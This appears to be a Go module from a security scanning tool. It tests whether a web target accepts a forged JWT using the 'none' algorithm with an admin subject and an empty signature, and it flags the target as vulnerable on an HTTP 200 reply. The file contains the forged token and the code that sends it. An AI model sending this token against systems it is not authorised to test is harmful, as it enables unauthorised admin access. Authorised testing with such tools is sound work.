package modules

import (
	"context"
	"net/http"
	"sync"
	"time"
)

// JWTSecurityAuditResult holds the result of the JWTSecurityAudit module execution.
type JWTSecurityAuditResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// JWTSecurityAudit executes the jwt_security_audit security technique.
type JWTSecurityAudit struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []JWTSecurityAuditResult
	client     *http.Client
}

// NewJWTSecurityAudit creates a new instance.
func NewJWTSecurityAudit(target string) *JWTSecurityAudit {
	return &JWTSecurityAudit{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *JWTSecurityAudit) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var jwtPayloads = []string{
	// "none" algorithm JWT (header: alg=none, payload: sub=admin, empty signature)
	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
}

func (m *JWTSecurityAudit) Execute(ctx context.Context) ([]JWTSecurityAuditResult, error) {
	m.results = make([]JWTSecurityAuditResult, 0)

	jobs := make(chan string, len(jwtPayloads))
	for _, p := range jwtPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for token := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testToken(ctx, token)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *JWTSecurityAudit) testToken(ctx context.Context, token string) {
	req, err := http.NewRequestWithContext(ctx, "GET", m.Target, nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		m.mu.Lock()
		m.results = append(m.results, JWTSecurityAuditResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Server accepted JWT with 'none' algorithm",
		})
		m.mu.Unlock()
	}
}
